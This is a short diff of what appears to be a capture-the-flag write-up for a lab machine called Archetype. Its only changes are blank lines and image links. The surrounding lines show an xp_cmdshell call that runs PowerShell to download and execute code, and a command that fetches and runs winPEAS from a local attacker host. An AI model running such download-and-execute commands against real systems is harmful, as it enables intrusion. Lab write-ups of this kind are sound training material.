@@ -54,4 +54,8 @@ EXEC xp_cmdshell 'powershell -c "IEX (New-Object System.Net.Webclient).DownloadS
 ```powershell
 iwr -uri http://10.10.14.11:8000/winPEASx64.exe -OutFile winPEAS.exe
 .\winPEAS.exe
+
+
 ```
+
+![](assets/images/posts/2025-03-06-Archetype/6c6a769b01b337f5043407c95d2f9261_MD5.jpeg)![](Pasted%20image%2020250306215106.png)
